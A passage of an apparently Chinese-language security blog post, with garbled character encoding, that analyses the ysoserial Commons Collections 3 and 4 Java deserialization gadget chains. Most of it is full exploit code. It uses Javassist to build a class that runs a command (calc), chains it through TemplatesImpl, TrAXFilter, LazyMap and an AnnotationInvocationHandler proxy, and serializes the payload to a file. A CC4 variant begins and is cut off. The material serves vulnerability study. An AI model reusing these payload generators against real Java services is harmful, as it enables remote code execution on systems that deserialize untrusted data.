<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h4 id="æ–¹æ³•äºŒ-InstantiateTransformer"><a href="#æ–¹æ³•äºŒ-InstantiateTransformer" class="headerlink" title="æ–¹æ³•äºŒ InstantiateTransformer"></a>æ–¹æ³•äºŒ InstantiateTransformer</h4><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span>runtime<span class="token punctuation">.</span></span><span class="token class-name">AbstractTranslet</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span>trax<span class="token punctuation">.</span></span><span class="token class-name">TemplatesImpl</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span>trax<span class="token punctuation">.</span></span><span class="token class-name">TrAXFilter</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span>trax<span class="token punctuation">.</span></span><span class="token class-name">TransformerFactoryImpl</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javassist<span class="token punctuation">.</span></span><span class="token class-name">ClassClassPath</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javassist<span class="token punctuation">.</span></span><span class="token class-name">ClassPool</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javassist<span class="token punctuation">.</span></span><span class="token class-name">CtClass</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span></span><span class="token class-name">Transformer</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>functors<span class="token punctuation">.</span></span><span class="token class-name">ChainedTransformer</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>functors<span class="token punctuation">.</span></span><span class="token class-name">ConstantTransformer</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>functors<span class="token punctuation">.</span></span><span class="token class-name">InstantiateTransformer</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>map<span class="token punctuation">.</span></span><span class="token class-name">LazyMap</span></span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>xml<span class="token punctuation">.</span>transform<span class="token punctuation">.</span></span><span class="token class-name">Templates</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">FileOutputStream</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">ObjectOutputStream</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">Target</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Constructor</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Field</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">InvocationHandler</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Proxy</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">HashMap</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Map</span></span><span class="token punctuation">;</span>


<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">CommonsCollections3Method2</span> <span class="token punctuation">&#123;</span>

    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>
        <span class="token comment">/* ç”Ÿæˆå­—èŠ‚ç  */</span>
        <span class="token class-name">ClassPool</span> classPool <span class="token operator">=</span> <span class="token class-name">ClassPool</span><span class="token punctuation">.</span><span class="token function">getDefault</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        classPool<span class="token punctuation">.</span><span class="token function">insertClassPath</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">ClassClassPath</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">AbstractTranslet</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">CtClass</span> cc <span class="token operator">=</span> classPool<span class="token punctuation">.</span><span class="token function">makeClass</span><span class="token punctuation">(</span><span class="token string">"Evil"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">String</span> cmd <span class="token operator">=</span> <span class="token string">"java.lang.Runtime.getRuntime().exec(\"calc\");"</span><span class="token punctuation">;</span>
        cc<span class="token punctuation">.</span><span class="token function">makeClassInitializer</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">insertBefore</span><span class="token punctuation">(</span>cmd<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//é€šè¿‡CtClass.makeClassInitializeræ–¹æ³•åœ¨å½“å‰ç±»åˆ›å»ºäº†ä¸€ä¸ªé™æ€ä»£ç å—</span>
        cc<span class="token punctuation">.</span><span class="token function">setName</span><span class="token punctuation">(</span><span class="token string">"Leihehe"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        cc<span class="token punctuation">.</span><span class="token function">setSuperclass</span><span class="token punctuation">(</span>classPool<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token class-name">AbstractTranslet</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//å¿…é¡»è¦ç»§æ‰¿AbstractTransletç±»</span>
        <span class="token keyword">final</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> classBytes <span class="token operator">=</span> cc<span class="token punctuation">.</span><span class="token function">toBytecode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//è·å–å­—èŠ‚ç </span>
        <span class="token comment">/* TemplatesImplåŠ è½½å­—èŠ‚ç  */</span>
        <span class="token class-name">TemplatesImpl</span> templates <span class="token operator">=</span> <span class="token class-name">TemplatesImpl</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//åˆ›å»ºä¸€ä¸ªtemplateså¯¹è±¡</span>
        <span class="token function">setFieldValue</span><span class="token punctuation">(</span>templates<span class="token punctuation">,</span><span class="token string">"_name"</span><span class="token punctuation">,</span><span class="token string">"leihehe"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">setFieldValue</span><span class="token punctuation">(</span>templates<span class="token punctuation">,</span><span class="token string">"_class"</span><span class="token punctuation">,</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">setFieldValue</span><span class="token punctuation">(</span>templates<span class="token punctuation">,</span><span class="token string">"_bytecodes"</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span>classBytes<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">setFieldValue</span><span class="token punctuation">(</span>templates<span class="token punctuation">,</span><span class="token string">"_tfactory"</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">TransformerFactoryImpl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>


        <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span> transformers <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span>
                <span class="token keyword">new</span> <span class="token class-name">ConstantTransformer</span><span class="token punctuation">(</span><span class="token class-name">TrAXFilter</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
                <span class="token keyword">new</span> <span class="token class-name">InstantiateTransformer</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token class-name">Templates</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span>templates<span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
        <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
        <span class="token class-name">ChainedTransformer</span> chainedTransformer <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ChainedTransformer</span><span class="token punctuation">(</span>transformers<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">Map</span> map <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">LazyMap</span> lazyMap <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">LazyMap</span><span class="token punctuation">)</span> <span class="token class-name">LazyMap</span><span class="token punctuation">.</span><span class="token function">decorate</span><span class="token punctuation">(</span>map<span class="token punctuation">,</span>chainedTransformer<span class="token punctuation">)</span><span class="token punctuation">;</span>


        <span class="token class-name">String</span> classToSerialize <span class="token operator">=</span> <span class="token string">"sun.reflect.annotation.AnnotationInvocationHandler"</span><span class="token punctuation">;</span>
        <span class="token keyword">final</span> <span class="token class-name">Constructor</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">></span></span> constructor <span class="token operator">=</span> <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span>classToSerialize<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredConstructors</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        constructor<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token comment">//åˆ›å»ºä»£ç†ç±»çš„å®ä¾‹</span>
        <span class="token class-name">InvocationHandler</span> <span class="token class-name">InvocationHandler</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">InvocationHandler</span><span class="token punctuation">)</span> constructor<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token class-name">Target</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> lazyMap<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token comment">//åˆ›å»ºhashmapçš„åŠ¨æ€ä»£ç†instanceï¼Œç°åœ¨æˆ‘ä»¬åªéœ€è¦call åˆ°evilMapçš„ä»»æ„functionå°±å¯ä»¥è§¦å‘ä»£ç†ç±»çš„invokeäº†</span>
        <span class="token class-name">Map</span> testMap <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">Map</span> evilMap <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">Map</span><span class="token punctuation">)</span> <span class="token class-name">Proxy</span><span class="token punctuation">.</span><span class="token function">newProxyInstance</span><span class="token punctuation">(</span>testMap<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getClassLoader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> testMap<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getInterfaces</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token class-name">InvocationHandler</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token comment">//åˆ›å»ºç¬¬äºŒä¸ªä»£ç†ç±»çš„å®ä¾‹</span>
        <span class="token class-name">InvocationHandler</span> anotherInvocationHandler <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">InvocationHandler</span><span class="token punctuation">)</span> constructor<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token class-name">Target</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> evilMap<span class="token punctuation">)</span><span class="token punctuation">;</span>


        <span class="token comment">/* å†™å‡ºåºåˆ—åŒ–æ–‡ä»¶ */</span>
        <span class="token class-name">ObjectOutputStream</span> outputStream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectOutputStream</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">FileOutputStream</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">"test.ser"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        outputStream<span class="token punctuation">.</span><span class="token function">writeObject</span><span class="token punctuation">(</span>anotherInvocationHandler<span class="token punctuation">)</span><span class="token punctuation">;</span>
        outputStream<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">setFieldValue</span><span class="token punctuation">(</span><span class="token keyword">final</span> <span class="token class-name">Object</span> obj<span class="token punctuation">,</span> <span class="token keyword">final</span> <span class="token class-name">String</span> fieldName<span class="token punctuation">,</span> <span class="token keyword">final</span> <span class="token class-name">Object</span> value<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">final</span> <span class="token class-name">Field</span> field <span class="token operator">=</span> <span class="token function">getField</span><span class="token punctuation">(</span>obj<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> fieldName<span class="token punctuation">)</span><span class="token punctuation">;</span>
        field<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>obj<span class="token punctuation">,</span> value<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">Field</span> <span class="token function">getField</span><span class="token punctuation">(</span><span class="token keyword">final</span> <span class="token class-name">Class</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">></span></span> clazz<span class="token punctuation">,</span> <span class="token keyword">final</span> <span class="token class-name">String</span> fieldName<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token class-name">Field</span> field <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>
        <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>
            field <span class="token operator">=</span> clazz<span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span>fieldName<span class="token punctuation">)</span><span class="token punctuation">;</span>
            field<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">NoSuchFieldException</span> ex<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span>clazz<span class="token punctuation">.</span><span class="token function">getSuperclass</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span>
                field <span class="token operator">=</span> <span class="token function">getField</span><span class="token punctuation">(</span>clazz<span class="token punctuation">.</span><span class="token function">getSuperclass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> fieldName<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">return</span> field<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h3 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h3><p>ç»¼åˆäº†cc1å’Œcc2ï¼Œåˆ©ç”¨äº†ä¹‹å‰å­¦è¿‡çš„åŠ¨æ€ä»£ç†ã€‚</p>
<h3 id="Reference-2"><a href="#Reference-2" class="headerlink" title="Reference"></a>Reference</h3><p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/230788">Ysoserial CommonsCollections1 è¯¦ç»†åˆ†æ</a></p>
<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/233393">ysoserial CommonsCollections3/4 è¯¦ç»†åˆ†æ</a></p>
<p><a target="_blank" rel="noopener" href="https://0range228.github.io/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/">Javaååºåˆ—åŒ–åˆ©ç”¨é“¾è¡¥å…¨è®¡åˆ’</a></p>
<h2 id="Commons-Collections-4"><a href="#Commons-Collections-4" class="headerlink" title="Commons Collections 4"></a>Commons Collections 4</h2><h3 id="ç¯å¢ƒæ­å»º-3"><a href="#ç¯å¢ƒæ­å»º-3" class="headerlink" title="ç¯å¢ƒæ­å»º"></a>ç¯å¢ƒæ­å»º</h3><ul>
<li><p>commons-collections4:4.0</p>
</li>
<li><p>jdk7u21ä¹‹å‰</p>
</li>
</ul>
<h3 id="åˆ©ç”¨é“¾æ„é€ "><a href="#åˆ©ç”¨é“¾æ„é€ " class="headerlink" title="åˆ©ç”¨é“¾æ„é€ "></a>åˆ©ç”¨é“¾æ„é€ </h3><p>åœ¨<code>commons-collections4:4.0</code>ä¸­ï¼Œ<code>InvokerTransfomer()</code>ä¸èƒ½å†ç”¨äº†ï¼Œæ‰€ä»¥æˆ‘ä»¬ç”¨åˆ°äº†</p>
<ul>
<li>cc2çš„å‰éƒ¨åˆ†: PriorityQueue -&gt; TransformingComparator</li>
<li>cc3çš„åéƒ¨åˆ†ï¼šInstanitateTransformer-&gt;TrAXFilter -&gt; TemplatesImpl</li>
</ul>
<h3 id="payloadæ„é€ "><a href="#payloadæ„é€ " class="headerlink" title="payloadæ„é€ "></a>payloadæ„é€ </h3><h4 id="æ–¹æ³•ä¸€"><a href="#æ–¹æ³•ä¸€" class="headerlink" title="æ–¹æ³•ä¸€"></a>æ–¹æ³•ä¸€</h4><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span>runtime<span class="token punctuation">.</span></span><span class="token class-name">AbstractTranslet</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span>trax<span class="token punctuation">.</span></span><span class="token class-name">TemplatesImpl</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span>trax<span class="token punctuation">.</span></span><span class="token class-name">TrAXFilter</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span>trax<span class="token punctuation">.</span></span><span class="token class-name">TransformerFactoryImpl</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javassist<span class="token punctuation">.</span></span><span class="token class-name">ClassClassPath</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javassist<span class="token punctuation">.</span></span><span class="token class-name">ClassPool</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javassist<span class="token punctuation">.</span></span><span class="token class-name">CtClass</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections4<span class="token punctuation">.</span></span><span class="token class-name">Transformer</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections4<span class="token punctuation">.</span>comparators<span class="token punctuation">.</span></span><span class="token class-name">TransformingComparator</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections4<span class="token punctuation">.</span>functors<span class="token punctuation">.</span></span><span class="token class-name">ChainedTransformer</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections4<span class="token punctuation">.</span>functors<span class="token punctuation">.</span></span><span class="token class-name">ConstantTransformer</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections4<span class="token punctuation">.</span>functors<span class="token punctuation">.</span></span><span class="token class-name">InstantiateTransformer</span></span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>xml<span class="token punctuation">.</span>transform<span class="token punctuation">.</span></span><span class="token class-name">Templates</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">FileOutputStream</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">ObjectOutputStream</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Field</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">PriorityQueue</span></span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">CommonsCollections4</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>
        <span class="token comment">/* ç”Ÿæˆå­—èŠ‚ç  */</span>
        <span class="token class-name">ClassPool</span> classPool <span class="token operator">=</span> <span class="token class-name">ClassPool</span><span class="token punctuation">.</span><span class="token function">getDefault</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        classPool<span class="token punctuation">.</span><span class="token function">insertClassPath</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">ClassClassPath</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">AbstractTranslet</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">CtClass</span> cc <span class="token operator">=</span> classPool<span class="token punctuation">.</span><span class="token function">makeClass</span><span class="token punctuation">(</span><span class="token string">"Evil"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">String</span> cmd <span class="token operator">=</span> <span class="token string">"java.lang.Runtime.getRuntime().exec(\"calc\");"</span><span class="token punctuation">;</span>
